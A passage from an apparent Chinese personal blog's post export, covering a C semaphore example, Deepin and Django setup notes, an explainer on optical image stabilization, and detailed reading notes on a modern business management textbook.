class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//释放信号量，解锁</span></span><br><span class="line">        signal.sem_op = <span class="number">1</span>;</span><br><span class="line">        code = semop(semId, &amp;signal, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">-1</span>) &#123;</span><br><span class="line">            LOG_ERROR(<span class="string">"semop failed, %d, %s"</span>, errno, strerror(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//删除信号量</span></span><br><span class="line">        <span class="keyword">int</span> code = semctl(semId, <span class="number">0</span>, IPC_RMID);</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">-1</span>) &#123;</span><br><span class="line">            LOG_ERROR(<span class="string">"semctl failed, %d, %s"</span>, errno, strerror(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//子进程</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程相关知识"><a href="#进程相关知识" class="headerlink" title="进程相关知识"></a>进程相关知识</h2><ul><li>进程除了创建的共享变量，所有变量包括全局变量和初始创建的变量均是不共享的</li><li>两个进程中地址相同的指针指向的是不同的位置，即malloc后fork出来的是两个malloc出来的指针，地址虽然打印相同，地址是逻辑地址，对两个进程是不同的。</li></ul>]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>Deepin系统使用笔记</title>
    <url>/2018/11/29/2018-11-29-deepinNotes/</url>
    <content><![CDATA[<h1 id="回收站的位置"><a href="#回收站的位置" class="headerlink" title="回收站的位置"></a>回收站的位置</h1><p>Deepin回收站的位置在</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~/.local/share/Trash/files</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Django框架学习</title>
    <url>/2018/11/23/2018-11-23-djangoStudy/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="使用pip命令安装"><a href="#使用pip命令安装" class="headerlink" title="使用pip命令安装"></a>使用pip命令安装</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install Django==<span class="number">2.1</span><span class="number">.3</span></span><br></pre></td></tr></table></figure><h2 id="官网下载安装"><a href="#官网下载安装" class="headerlink" title="官网下载安装"></a>官网下载安装</h2><p><a href="https://www.djangoproject.com/download/" target="_blank" rel="noopener">官网下载地址</a></p><p>下载最新包后使用以下命令安装</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><h2 id="验证安装是否成功"><a href="#验证安装是否成功" class="headerlink" title="验证安装是否成功"></a>验证安装是否成功</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> django</span><br><span class="line">django.get_version()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>OIS光学防抖资料收集</title>
    <url>/2018/11/20/2018-11-20-OISDataCollection/</url>
    <content><![CDATA[<p>OIS，它的全称是<code>Optical Image Stabilization</code>，从字面理解就是稳定的光学图象。通过镜头的浮动透镜来纠正“光轴偏移”，其原理是通过镜头内的陀螺仪侦测到微小的移动，然后将信号传至微处理器，处理器立即计算需要补偿的位移量，然后通过补偿镜片组，根据镜头的抖动方向及位移量加以补偿；从而有效的克服因相机的振动产生的影像模糊。这种防抖技术对镜头设计制造要求比较高，而且成本也相对高一些。</p><h2 id="OIS光学防抖有什么用？"><a href="#OIS光学防抖有什么用？" class="headerlink" title="OIS光学防抖有什么用？"></a>OIS光学防抖有什么用？</h2><p>OIS光学防抖可以提升手机的拍摄，有以下三方面。</p><ul><li>稳定拍摄</li></ul><p>对于普通用户来说，使用手机拍照不会像那些摄影达人一样动辄就三脚架稳定器招呼着，往往只能通过双手来进行拍照，有时甚至只会随手一拍。而当处于这样的场景下时，如果手机的快门过慢，就很可能出现成像很虚的情况，而如果手机拥有OIS光学防抖，就能够起到稳定拍摄的作用，使手持拍摄不会产生模糊不清的情况，提升拍照体验。</p><ul><li>提升暗光拍摄品质</li></ul><p>另外，手机加入OIS光学防抖还能够弥补手机在暗光环境下拍照的表现。目前在日常拍摄领域，手机摄影相较于高端卡片机和低端单反，最突出的短板就是暗光条件下的拍摄效果了。<br>而在暗光环境下，要想提高照片的明亮程度，主要就要通过感光度，曝光时间，光圈这3种途径。<br>通过提高感光度来提升画面亮度，是较为粗暴的方式。因为在手机上，感光度的提升会给手机带来明显的噪点；延长曝光时间，会容易造成画面抖动。这对照片的影响是致命性的，可能直接导致照片不可用；增大光圈，这是今年来手机厂商的普遍做法，但由于光学技术发展的缓慢与不成熟性，很多手机在增大光圈上的做法都比较保守。<br>所以光学防抖的作用就是通过克服（减轻）画面抖动，延长曝光时间，从而提高手机暗光下的拍摄质量。</p><ul><li>增强画面亮度 提升暗部细节</li></ul><h2 id="而在普通条件下，光学防抖对画质是否有影响呢？"><a href="#而在普通条件下，光学防抖对画质是否有影响呢？" class="headerlink" title="而在普通条件下，光学防抖对画质是否有影响呢？"></a>而在普通条件下，光学防抖对画质是否有影响呢？</h2><p>假设手机安全快门的速度是1/30秒，那么用光学防抖之后的安全快门速度就变成了1/8秒。而在暗光拍摄中，1/30秒的速度进光量是远小于1/8秒的。<br>所以在同样的条件下，有了光学防抖之后，我们会看到照片更明亮，暗部细节更清楚，画质比采用数字防抖的手机好一些。</p><h2 id="那么，为什么手机采用了光学防抖，拍照效果没有明显提升？"><a href="#那么，为什么手机采用了光学防抖，拍照效果没有明显提升？" class="headerlink" title="那么，为什么手机采用了光学防抖，拍照效果没有明显提升？"></a>那么，为什么手机采用了光学防抖，拍照效果没有明显提升？</h2><p>因为光学防抖可以理解为只是通过提高安全快门速度来提高镜头的进光量，最终决定画质的是感光元件和镜头。如果没有光学防抖，我们也可以通过其他途径来提高安全快门速度来提高镜头的进光量。比如利用外设三脚架，或者从软件上手动调整感光度，很多手机厂商甚至对手机相机的预设参数进行了调整，在一定环境下不惜牺牲成像后的整体画质来提升照片在手机中的视觉效果，所以很多时候我们在手机中看到拍出的照片很精美，不过放到电脑中就不是那么回事了，就是这个道理。<br>如果我们剔除手机厂商在软件方面动的手脚，在光线充足的环境下，具有光学防抖的手机与采用数字防抖的手机本身表现也不会相差太多，感觉提升不明显也在情理之中。但在暗光环境下拍照对比一下，相信效果就显而易见了。</p><p>OIS技术，是一种更加完善的防抖技术是人们在拍摄时，大变焦的情况下，可以实现更高的精确度和准确度。其补偿操作的频率达到上一代系统的8倍，是人们在拍摄时，大变焦的情况下，可以实现更高的精确度和准确度。其补偿操作的频率达到上一代系统的8倍。</p><p>该系统采用陀螺传感器来检测手部抖动，然后移动镜片并调整其光轴进行补偿。上一代系统对手部抖动进行检测和补偿的频率约为500次每秒，而新的高级O.I.S.的工作频率约为4000次每秒。该系统为光学系统，不会降低画质，从而使拍摄的影像能够充分展现原有的完美效果。在大屏幕、高分辨率电视时代，画面中的每一处瑕疵都是显而易见的。所以高级O.I.S.确实是必不可少的画面稳定系统，有了它即使手部出现轻微的抖动，画面也不会有一丝一毫的模糊。光学防抖和四轴防抖差不多。</p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>读书笔记————现代企业管理学</title>
    <url>/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/</url>
    <content><![CDATA[<h1 id="现代企业管理学"><a href="#现代企业管理学" class="headerlink" title="现代企业管理学"></a>现代企业管理学</h1><ul><li>主编：吴金法</li></ul><h2 id="第一篇、管理编论篇"><a href="#第一篇、管理编论篇" class="headerlink" title="第一篇、管理编论篇"></a>第一篇、管理编论篇</h2><h3 id="第1章-企业管理概述"><a href="#第1章-企业管理概述" class="headerlink" title="第1章 企业管理概述"></a>第1章 企业管理概述</h3><ul><li>企业概述<ul><li>企业的概念及其特征<ul><li>企业是一个历史范畴</li><li>企业的定义及其特征<ul><li>经济性</li><li>营利性</li><li>社会性</li></ul></li></ul></li><li>企业的类型<ul><li>个人独资企业(Proprietorship)</li><li>合伙企业(Partnership, Single Proprietorship)</li><li>公司(Company, Corporation)<ul><li>有限责任公司</li><li>股份有限公司</li></ul></li></ul></li><li>现代企业制度<ul><li>委托代理关系</li><li>有限责任制度</li><li>法人财产制度</li><li>组织管理制度</li></ul></li></ul></li><li>管理的性质与职能<ul><li>管理的定义 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_01.bmp"></li><li>管理的科学性与艺术性</li><li>管理的基本问题<ul><li>物质资源</li><li>金融资源</li><li>信息资源</li><li>人力资源</li><li>关系资源<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_02.bmp"></li></ul></li><li>管理中的人性假设 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_03.bmp"></li><li>管理职能<ul><li>计划。管理活动从计划开始，计划是管理过程的首要职能</li><li>组织。要把计划落实到行动中，就必须要有组织工作</li><li>领导。每一个组织都是由人力资源有机结合而成的，人是组织活动中惟一具有能动性的因素</li><li>控制。为了保证组织目标的实现和既定计划的顺利进行，管理者必须将实际的表现与预先设定的目标进行比较<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_04.bmp"></li></ul></li><li>工商企业管理的基本任务<ul><li>经济效益</li><li>生产性的工作及员工的成就</li><li>社会影响与杜会贵任</li></ul></li></ul></li><li>管理者<ul><li>管理者的类型<ul><li>管理者的层次分类 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_05.bmp"> <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_06.bmp"></li><li>管理人员的领域分类 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_07.bmp"></li></ul></li><li>有效的管理者与成功的管理者 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_08.bmp"></li><li>管理者的任务 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_09.bmp"></li><li>管理者应具备的技能 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_10.bmp"></li></ul></li><li>企业管理的环境<ul><li>环境对企业的影响</li><li>企业的一般环境<ul><li>政治环境</li><li>社会文化环境</li><li>经济环境</li><li>科技环境</li><li>自然环境</li></ul></li><li>企业的任务环境<ul><li>现有竞争对手<ul><li>基本情况的研究</li><li>主要竞争对手的研究</li><li>竞争对手的发展方向</li></ul></li><li>潜在竞争对手</li><li>替代品生产者</li><li>用户<ul><li>用户的需求</li><li>用户的价格谈判能力</li></ul></li><li>供应商</li></ul></li><li>企业文化<ul><li>企业文化及其构成 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_11.bmp"></li><li>企业文化的特点<ul><li>客观性</li><li>个异性</li><li>民族性</li><li>稳定性</li></ul></li><li>企业文化对管理的影响 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_12.bmp"> <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_13.bmp"></li></ul></li><li>环境分析方法<ul><li>识别环境不确定程度的方法 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_14.bmp"></li><li>内外部环境综合分析法(SWOT 分析法） <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_15.bmp"></li></ul></li></ul></li></ul><h3 id="第2章-管理理论的发展"><a href="#第2章-管理理论的发展" class="headerlink" title="第2章 管理理论的发展"></a>第2章 管理理论的发展</h3><ul><li>古典管理理论<ul><li>泰罗的科学管理理论<ul><li>工作定额原理</li><li>能力与工作相适应</li><li>标准化原理</li><li>刺激性的报酬制度</li><li>工人和雇主两方面必须进行－场“精神革命”</li><li>计划同执行相分离</li><li>在管理控制上实行例外原则</li></ul></li><li>法约尔的一般管理思想<ul><li>关于经营与管理<ul><li>企业的经营有六项活动<ul><li>技术活动</li><li>商业活动</li><li>财务活动</li><li>安全活动</li><li>会计活动</li><li>管理活动<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_16.bmp"></li></ul></li></ul></li><li>关于管理的一般原则<ul><li>分工</li><li>权力和责任</li><li>纪律</li><li>命令的统一性</li><li>指挥的统一性</li><li>个人利益服从整体利益</li><li>报酬</li><li>集权</li><li>等级系列</li><li>秩序</li><li>公平</li><li>人员的稳定</li><li>首创精神</li><li>集体精神</li></ul></li></ul></li><li>韦伯的古典组织理论<ul><li>存在明确的分工</li><li>组织内的各个职位，按照等级原则进行法定的安排，形成自上而下的等级系列。</li><li>组织是根据明文规定的法规、规罩组成的，法规、规章不变，组织结构也固定不变</li><li>组织成员之间的关系，只是一种职位关系，不受个人感情影响。</li><li>人员的任用，通过公开的考试来选拔，有严格的选择标准。</li></ul></li><li>梅奥的人际关系理论<ul><li>职工是“社会人”，而不是单纯追求金钱的“经济人”</li><li>企业中存在一种“非正式组织”</li><li>新型的领导在于通过“满足度”的增加来提高职工的“士气”，从而达到提高效率的目的</li></ul></li></ul></li><li>现代管理理论<ul><li>管理理论丛林 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_17.bmp"></li><li>系统管理理论<ul><li>企业是由人、物资、机器和其他资源在一定目标下组成的一体化系统，它的成长和发展同时受到这些组成要素的影响，在这些要素的相互关系中，人是主体，其他要素则是被动的。</li><li>企业是一个由许多子系统组成的、开放的社会技术系统</li><li>运用系统观点来考察管理的基本职能，可以提高组织的整体效率，使管理人员不至于只重视某些与自己有关的特殊职能而忽视了大目标，不至于忽视自己在组织中的地位与作用。</li></ul></li><li>权变管理理论<ul><li>过去的管理理论可分为四种，即过程学说、计量学说、行为学说和系统学说</li><li>权变管理理论就是考虑到有关环境的变数同相应的管理观念和技术之间的关系，使采用的管理观念和技术能有效地发挥作用</li><li>环境变量与管理变晕之间的函数关系就是权变关系，这是权变管理理论的核心内容<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_18.bmp"></li></ul></li></ul></li><li>现代管理思想的新发展<ul><li>流程再造<ul><li>流程及其特点<ul><li>逻辑性</li><li>变动性</li><li>可分解性</li></ul></li><li>流程再造的定义<ul><li>企业生存与发展环境发生了巨大变动<ul><li>顾客(Customer)多样性</li><li>变革(Change)</li><li>竞争(Competition)</li></ul></li><li>核心内容<ul><li>根本性再思考</li><li>彻底性再设计</li><li>戏剧性改善</li></ul></li></ul></li><li>流程再造的原则<ul><li>注重整体流程最优的系统思想。</li><li>在真正产生信息的实际工作中处理信息。</li><li>将分散的资源视为一体。</li><li>将并行工作联系起来。</li><li>在工作中决策，实现自我控制。</li><li>从信息来源地一次性获取信息。</li><li>面向客户和供应商整合企业业务流程。</li></ul></li></ul></li><li>学习型组织<ul><li>学习型组织的特征<ul><li>组织成员拥有一个共同的愿景．</li><li>组织由多个创造性个体组成。</li><li>善于不断学习。</li><li>“地方为主”的扁平式结构</li><li>自主管理</li><li>组织的边界将被重新界定</li><li>员工家庭与事业的平衡。</li><li>领导者的新角色</li></ul></li><li>学习型组织的“五项修炼”<ul><li>自我超越(personal mastery)</li><li>改善心智模式(improving mental models)</li><li>建立共同愿景( building shared vision )</li><li>团队学习(team learning)</li><li>系统思考(systems thinking)<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_19.bmp"></li></ul></li></ul></li><li>标杆管理<ul><li>标杆管理的涵义</li><li>标杆管理的类型<ul><li>内部标杆管理</li><li>竞争标杆管理</li><li>职能标杆管理</li><li>流程标杆管理</li></ul></li><li>标杆管理的基本要求<ul><li>高层管理人员的兴趣与支持；</li><li>对企业运作和改进要求的充分了解；</li><li>接受新观念改变陈旧思维方式的坦诚态度；</li><li>愿意与合作者分享信息；</li><li>致力于持续的标杆管理，</li><li>有能力把企业运作与战略目标紧密结合起来；</li><li>能将财务和非财务信息集成供管理层和员工使用的信息；</li><li>有致力千与顾客要求相关的核心职能改善的能力；</li><li>追求高附加值；</li><li>避免讨论定价或竞争性敏感成本等方面的内容；</li><li>不要向竞争者索要敏感数据；</li><li>未经许可，不要分享所有者信息；</li><li>选择一个无倾向的第二者在不公开企业名称的情况卜来栠成和提供竞争性数据；</li><li>不要基千标杆数据向外界贬低竞争者的商务活动。</li></ul></li></ul></li></ul></li><li>中国古代管理思想<ul><li>儒家管理思想<ul><li>孔子的管理思想</li><li>孟子的管理思想</li><li>儒家的“性善论”与“性恶论”</li></ul></li><li>道家管理思想</li><li>法家管理思想</li><li>《孙子兵法》中的管理思想</li><li>商家的经营管理思想<ul><li>范蠡的“积蓄之理”</li><li>白圭的“治生之学”</li></ul></li></ul></li></ul><h2 id="第二篇、管理职能篇"><a href="#第二篇、管理职能篇" class="headerlink" title="第二篇、管理职能篇"></a>第二篇、管理职能篇</h2><h3 id="第3章-管理的计划职能"><a href="#第3章-管理的计划职能" class="headerlink" title="第3章 管理的计划职能"></a>第3章 管理的计划职能</h3><ul><li>计划<ul><li>计划工作<ul><li>计划工作</li><li>计划工作的特点<ul><li>效率性</li><li>首位性</li><li>普遍性</li><li>创造性</li></ul></li><li>计划管理人员的职责<ul><li>综观和掌握整个计划工作过程</li><li>评审已制订出来的计划草案</li><li>解决计划工作中出现的问题</li><li>定期检查计划的执行情况</li></ul></li></ul></li><li>计划的类型及其制定<ul><li>计划的类型<ul><li>长期计划、中期计划和短期计划</li><li>战略计划和行动计划 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_20.bmp"></li><li>综合计划、部门计划和项目计划</li></ul></li><li>计划的内容 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_21.bmp"></li><li>计划的制订<ul><li>目标的明确</li><li>战略或行动方案的制订</li><li>落实人选、明确责任</li><li>制订进度表</li><li>分配资源</li></ul></li><li>计划的审定</li></ul></li><li>编制计划的方法<ul><li>定额换算法</li><li>系数推导法</li><li>经验平衡法</li><li>滚动计划法</li></ul></li><li>影响计划有效性的权变因素<ul><li>管理层次</li><li>企业生命周期</li><li>环境的不确定性程度</li></ul></li><li>计划工作的原理<ul><li>限定因素原理</li><li>许诺原理</li><li>灵活性原理</li><li>改变航道原理</li></ul></li></ul></li><li>目标管理<ul><li>企业目标<ul><li>企业目标的特点<ul><li>全局性</li><li>针对性</li><li>可分性</li><li>阶段性</li></ul></li><li>企业目标的主要内容<ul><li>贡献目标</li><li>收益目标</li><li>市场目标</li></ul></li><li>目标设置的基本原则<ul><li>目标应为是具体明确的</li><li>目标应当是难度适中的</li><li>目标应当被个人所认可</li><li>必须对达到目标的进程有及时客观的反馈信息</li><li>个人参与设置的目标要比别人为他设置的目标更为有效</li></ul></li></ul></li><li>目标管理的特点<ul><li>目标管理的概念</li><li>目标管理的特点<ul><li>实行员工参与管理</li><li>强调“自我控制”</li><li>重视员工能力开发</li><li>注重成果第一的方针</li></ul></li><li>目标管理的重要意义 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_22.bmp"></li></ul></li><li>目标管理的基本过程<ul><li>目标展开<ul><li>目标分解</li><li>目标对策展开</li><li>目标协商</li><li>明确目标责任</li><li>编制目标展开图和个人目标卡</li></ul></li><li>目标实施<ul><li>权力下放和自我控制</li><li>实施过程的检查和控制</li></ul></li><li>目标成果评价</li></ul></li></ul></li><li>决策<ul><li>决策及分类<ul><li>决策的定义<ul><li>决策要有明确的目的</li><li>决策要有若干可行的备用方案</li><li>决策的结果是选择一个满意的方案</li><li>决策是一个分析判断过程</li></ul></li><li>决策的意义<ul><li>决策贯穿于管理过程始终</li><li>决策正确与否直接关系到企业的生存与发展</li><li>决策能力是衡量管理者水平高低的重要标志</li></ul></li><li>决策的分类<ul><li>战略决策、管理决策和业务决策</li><li>桯序化决策和非程序化决策</li><li>确定型决策、风险型决策和不确定型决铅</li></ul></li></ul></li><li>决策程序<ul><li>判断问题——认识和分析问题<ul><li>首先确定是否存在需要解决的问题</li><li>确定问题出在何处</li><li>明确真正的问题及其可能的原因</li></ul></li><li>明确决策目标</li><li>拟定可供选择的行动方案</li><li>分析评价各行动方案</li><li>选择满意方案并付诸实施<ul><li>任何方案均有风险</li><li>不要一味追求最佳方案</li><li>在最终选择时，应允许不作任何选择</li></ul></li><li>监督与反馈</li></ul></li><li>决策的影响因素<ul><li>环境</li><li>过去决策</li><li>决策者对风险的态度</li><li>组织文化</li></ul></li><li>决策方法<ul><li>程序化决策方法<ul><li>政策</li><li>规章制度</li><li>程序</li></ul></li><li>适应性决策方法<ul><li>渐进式决策方法</li><li>经验式决策方法</li></ul></li><li>创造性决策方法<ul><li>头脑风暴法</li><li>发散思维法</li></ul></li><li>期望值法<ul><li>保守型（又称小中取大法或悲观原则）</li><li>进取型（又称好中求好法或乐观原则）</li><li>稳妥型（又称最小后悔值原则）</li></ul></li></ul></li></ul></li><li>战略管理<ul><li>企业战略及构成要素<ul><li>企业战略的概念</li><li>战略的特征<ul><li>全局性</li><li>长期性和相对稳定性</li><li>适应性</li></ul></li><li>企业战略的构成要素<ul><li>经营范围</li><li>战略目标</li><li>战略行动</li><li>资源配置</li><li>竞争优势</li><li>协同作用<ul><li>投资协同作用</li><li>作业协同作用</li><li>销售协同作用</li><li>管理协同作用</li></ul></li></ul></li></ul></li><li>战略管理<ul><li>战略管理的概念<ul><li>注重长远利益和整体利益</li><li>注重环境的动态分析</li><li>所涉及的内容都是关系企业生死存亡的重大问题</li><li>战略管理过程</li></ul></li><li>企业战略分类<ul><li>公司战略、事业战略和职能战略</li><li>产品战略、市场战略和技术战略</li><li>密集型发展战略、一体化发展战略和多样化发展战略</li></ul></li><li>战略管理过程<ul><li>战略分析</li><li>战略选择<ul><li>总成本领先战略</li><li>差别化战略</li><li>专业化战略</li></ul></li><li>战略实施。战略实施需要抓好四个主要环节<ul><li>制定实施计划和方案</li><li>分配资源</li><li>组织设计</li><li>战略实施过程的控制</li></ul></li><li>战略评价</li></ul></li></ul></li></ul></li></ul><h3 id="第4章-管理的组织职能"><a href="#第4章-管理的组织职能" class="headerlink" title="第4章 管理的组织职能"></a>第4章 管理的组织职能</h3><ul><li>组织结构设计<ul><li>组织系统 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_23.bmp"></li><li>组织职能的内容<ul><li>建立组织结构<ul><li>生产经营系统的组织结构</li><li>管理系统的组织结构</li></ul></li><li>划分职责和权力</li><li>建立信息沟通网</li><li>调配企业资源</li></ul></li><li>组织结构设计的原则<ul><li>统一指挥，分级管理</li><li>精简效率原则</li><li>弹性原则</li><li>协调原则</li></ul></li><li>部门划分<ul><li>职能部门化</li><li>产品部门化</li><li>地区部门化</li><li>顾客部门化</li></ul></li><li>管理幅度与管理层次<ul><li>管理幅度<ul><li>管理幅度的大小主要受以下几个方面的影响<ul><li>管理者的素质与能力。</li><li>下属人员的成熟程度。</li><li>下属人员工作的相似性和新问题的发生率。</li><li>信息联系和意见沟通的难易程度．</li><li>工作采用标准化程序的程度和有关规章制度的健全情况。</li></ul></li></ul></li><li>管理层次<ul><li>最高管理层，也称决策层</li><li>中间管理层，也称实施层</li><li>执行管理层，也称执行层</li></ul></li></ul></li><li>组织结构形式<ul><li>直线一职能制 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_24.bmp"></li><li>事业部制 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_25.bmp"></li><li>模拟分权制 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_26.bmp"></li><li>矩阵制 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_05_27.bmp"></li><li>委员会制</li></ul></li></ul></li><li>职权类型与职权关系<ul><li>职权类型<ul><li>直线职权</li><li>参谋职权</li><li>职能职权</li></ul></li><li>正确处理职权关系<ul><li>直线职权与参谋职权之间的关系<ul><li>直线人员在进行重大决策之前要征询组织成员或参谋人员的意见</li><li>这两种职权之间在性质上是不同的</li><li>注意<ul><li>要明确两种职权之间的关系</li><li>直线人员要倾听参谋人员的意见，并随时向参谋人员提供有关情况</li><li>参谋人员要努力提高自己的工作水平</li><li>创造相互合作的良好气氛氛，组织中人与人之间友好的合作关系常在减少矛盾方面发挥重要的作用</li></ul></li></ul></li><li>直线职权与职能职权之间的关系</li></ul></li><li>授权<ul><li>授权的定义<ul><li>区别以下问题<ul><li>授权井不意味着授责</li><li>授权不同于代理职务</li><li>授权不同于助理或秘书职务</li><li>授权不同于分工</li><li>授权不同于分权</li></ul></li></ul></li><li>授权的益处<ul><li>可使高层管理人员从日常事务中解脱出来，专心处理重大问题</li><li>可提高下属的工作情绪，增强其责任心，并增进效率</li><li>可增长下属的才干．有利于管理人员的培养</li><li>可充分发挥下属的专长．以补救授权者自身才能之不足</li></ul></li><li>授权的基本过程<ul><li>任务的分派</li><li>权力的授予</li><li>责任的明确</li><li>监控权的确认</li></ul></li><li>授权的原则<ul><li>因事设人，视能授权</li><li>明确所授事项</li><li>不可越级授权</li><li>适度授权</li><li>适当控制</li><li>相互信赖</li></ul></li></ul></li></ul></li><li>组织协调与组织变革<ul><li>组织协调<ul><li>组织协调的涵义</li><li>组织协调的原则<ul><li>直接交涉原则</li><li>预见性原则</li><li>规范性原则</li><li>权变原则</li></ul></li><li>组织协调的方法<ul><li>组织协调<ul><li>利用委员会</li><li>调整和改变组织机构</li><li>组织结构创新</li></ul></li><li>制度协调</li><li>目标协调</li><li>信息协调<ul><li>书面沟通</li><li>口头沟通</li></ul></li><li>领导协调</li><li>人事协调</li><li>思想工作协调</li></ul></li></ul></li><li>组织变革<ul><li>组织变革的原因<ul><li>组织变革的外部原因</li><li>组织变革的内部原因</li></ul></li><li>组织变革的内容和方法<ul><li>结构变革</li><li>技术变革</li><li>人的变革<ul><li>敏感性训练</li><li>调查反馈</li><li>过程咨询</li><li>团队建设</li><li>组际发展</li></ul></li></ul></li><li>变革的阻力<ul><li>个人或群体原有的习惯</li><li>担心失去既得利益</li><li>认为变革不符合组织的目标和最佳利益</li></ul></li><li>降低变革阻力的策略<ul><li>教育与沟通</li><li>参与</li><li>促进与支持</li><li>谈判</li><li>操纵与合作</li><li>强制</li><li>力场分析</li></ul></li></ul></li></ul></li></ul><h3 id="第5章-管理的领导职能"><a href="#第5章-管理的领导职能" class="headerlink" title="第5章 管理的领导职能"></a>第5章 管理的领导职能</h3><ul><li>领导与领导者<ul><li>领导的实质<ul><li>领导与领导者的定义</li><li>领导的作用<ul><li>指挥作用</li><li>激励作用</li><li>协调作用</li><li>沟通作用</li></ul></li><li>领导的实质 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_28.bmp"></li></ul></li><li>领导权利的构成<ul><li>权力的性质<ul><li>权力的情景性</li><li>权力的依赖性</li><li>权力的不确定性</li><li>权力的资源性</li></ul></li><li>领导权力的构成 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_29.bmp"></li></ul></li></ul></li><li>现代领导理论<ul><li>领导特性理论<ul><li>传统领导特性理论</li><li>现代领导特性理论</li></ul></li><li>领导行为理论<ul><li>领导作风理论<ul><li>专制型领导作风</li><li>民主型领导作风</li><li>放任型领导作风<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_30.bmp"></li></ul></li><li>领导行为四分图理论 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_31.bmp"> <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_32.bmp"></li><li>管理方格理论</li><li>领导风格对下属行为的影响<ul><li>影响领导风格的因素<ul><li>领导者个性特征</li><li>下属的个性特征</li><li>组织环境</li></ul></li><li>领导风格对下属行为的影响</li></ul></li></ul></li><li>领导权变理论<ul><li>领导行为连续统一体模式 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_33.bmp"></li><li>菲德勒的权变模式 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_34.bmp"></li><li>领导生命周期理论 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_35.bmp"></li></ul></li></ul></li><li>激励<ul><li>激励的基本原理<ul><li>需要、动机与行为的关系 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_36.bmp"></li><li>激励的定义</li><li>激励的作用<ul><li>激励是调动员工积极性的主要手段</li><li>激励是提高人员素质的重要手段</li><li>激励是形成良好企业文化的有效途径</li></ul></li></ul></li><li>内容型激励理论<ul><li>马斯洛的需要层次论 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_37.bmp"></li><li>赫茨伯格的双因素理论 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_38.bmp"> * 为了实现这种激励，可以通过以下几种途径 * 工作适应性 * 工作的意义与挑战性 * 工作的完整性或成果性 * 